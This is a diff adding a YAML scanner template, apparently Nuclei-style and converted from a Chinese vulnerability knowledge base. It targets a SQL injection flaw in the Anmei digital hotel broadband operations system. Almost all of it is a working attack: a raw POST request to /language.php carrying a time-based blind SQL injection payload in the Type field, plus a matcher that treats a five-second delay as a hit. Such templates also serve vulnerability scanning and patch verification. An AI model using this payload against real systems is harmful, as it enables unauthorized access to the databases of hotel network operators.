@@ -1,0 +1,60 @@
+id: poc-zfqll7gp2n3ctwvc
+info:
+  name: 安美数字酒店宽带运营系统SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zfqll7gp2n3ctwvc
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zfqll7gp2n3ctwvc
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /language.php HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+    Accept-Encoding: gzip,deflate,br
+
+
+    Connection: Keep-alive
+
+
+
+
+    EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0''XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR''&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
